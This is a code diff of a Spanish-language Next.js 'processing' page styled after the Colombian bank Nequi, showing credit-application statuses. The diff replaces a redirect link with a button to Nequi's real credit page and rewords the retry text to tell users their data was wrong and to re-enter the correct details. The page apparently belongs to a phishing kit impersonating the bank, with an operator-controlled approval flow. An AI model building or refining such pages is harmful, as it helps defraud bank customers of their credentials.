@@ -7,6 +7,7 @@ import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { useRouter } from "next/navigation"
 import TransitionLoader from "../components/transition-loader"
+import Link from "next/link"
 
 export default function ProcesandoPage() {
   const [status, setStatus] = useState<'processing' | 'approved' | 'rejected' | 'retry'>('processing')
@@ -129,7 +130,7 @@ export default function ProcesandoPage() {
               {status === 'processing' && 'Procesando solicitud...'}
               {status === 'approved' && '¡Solicitud Aprobada!'}
               {status === 'rejected' && 'Solicitud Rechazada'}
-              {status === 'retry' && 'Se requiere reintentar'}
+              {status === 'retry' && '¡Ups no se pudo!'}
             </CardTitle>
           </CardHeader>
           <CardContent className="text-center space-y-6 pt-4">
@@ -168,12 +169,11 @@ export default function ProcesandoPage() {
                   <p className="text-lg text-gray-700">
                     Tu crédito ha sido pre-aprobado. En breve recibirás un mensaje con los siguientes pasos.
                   </p>
-                  <a
-                    href="/http://redirect.nequi.co/propeller?_ga=2.183392037.223030828.1738021257-931538480.1737406899"
-                    className="block bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl"
-                  >
+                  <Button 
+                    onClick={() => window.open('https://www.nequi.com.co/personas/credito/propulsor', '_blank')}
+                    className="bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl">
                     Continuar
-                  </a>
+                  </Button>
                 </div>
               </>
             ) : status === 'rejected' ? (
@@ -189,10 +189,9 @@ export default function ProcesandoPage() {
                   <p className="text-lg text-gray-700">
                     En este momento no podemos aprobar tu solicitud. Te invitamos a intentarlo nuevamente en unos dias.
                   </p>
-                  <Button
-                    onClick={() => router.push('/page')}
-                    className="bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl"
-                  >
+                  <Button 
+                    onClick={() => router.push('/')}
+                    className="bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl">
                     Volver al inicio
                   </Button>
                 </div>
@@ -208,7 +207,7 @@ export default function ProcesandoPage() {
                 </div>
                 <div className="space-y-4">
                   <p className="text-lg text-gray-700">
-                    ¡Ups no se pudo!. vuelve a ingresar sus datos.
+                    estos no son tus datos, tranquilo, intenta nuevamente con los datos correctos.
                   </p>
                   <p className="text-center text-gray-600">
                     Redirigiendo al inicio...
